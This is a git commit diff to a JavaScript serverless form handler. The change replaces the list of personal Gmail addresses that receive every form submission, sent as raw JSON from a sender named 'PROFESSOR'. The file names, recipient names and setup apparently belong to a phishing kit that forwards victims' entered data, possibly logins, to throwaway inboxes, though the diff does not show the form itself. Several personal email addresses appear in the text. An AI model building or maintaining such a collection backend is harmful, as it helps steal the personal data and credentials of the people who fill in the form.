fb7afef6fce98b6ef2b9b73495e480e9f23739f8
Adezrsa543219 <226099557+Adezrsa543219@users.noreply.github.com>
2026-03-24 15:39:42 +0500

    Update and rename 5.js to sultan.js

--- sultan.js
+++ sultan.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,nizamanisanaullah63@gmail.com",
+      to: "aseymbwaayebroiwillmake@gmail.com,adsmenigar@gmail.com,",
       subject: "Sanaulah",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
